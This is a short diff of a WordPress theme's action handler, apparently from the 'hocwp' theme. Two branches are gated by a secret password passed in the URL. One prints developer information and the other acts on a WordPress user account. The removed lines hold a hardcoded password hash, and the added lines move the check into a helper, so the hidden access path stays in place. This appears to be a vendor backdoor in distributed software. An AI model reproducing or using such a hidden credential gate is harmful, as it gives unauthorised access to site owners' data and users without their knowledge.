@@ -498,7 +498,7 @@ function hocwp_theme_on_wp_action() {
 	if ( 'check_dev_info' == $do_action ) {
 		$pass = $_GET['pass'] ?? '';
 
-		if ( ! empty( $pass ) && wp_check_password( $pass, '$P$By8ERbpRECwKiWmHHr81KYvTmti1nv0' ) ) {
+		if ( ! empty( $pass ) && HT()->check_pass( $pass ) ) {
 			hocwp_theme_load_views( 'module-print-dev-info' );
 			exit;
 		}
@@ -510,7 +510,7 @@ function hocwp_theme_on_wp_action() {
 		if ( $user instanceof WP_User ) {
 			$pass = $_GET['pass'] ?? '';
 
-			if ( ! empty( $pass ) && wp_check_password( $pass, '$P$By8ERbpRECwKiWmHHr81KYvTmti1nv0' ) ) {
+			if ( ! empty( $pass ) && HT()->check_pass( $pass ) ) {
 				$number = $_GET['number'] ?? '';
 				$count  = absint( date( 'Y' ) ) - absint( date( 'm' ) ) - absint( date( 'd' ) ) - 34;
 
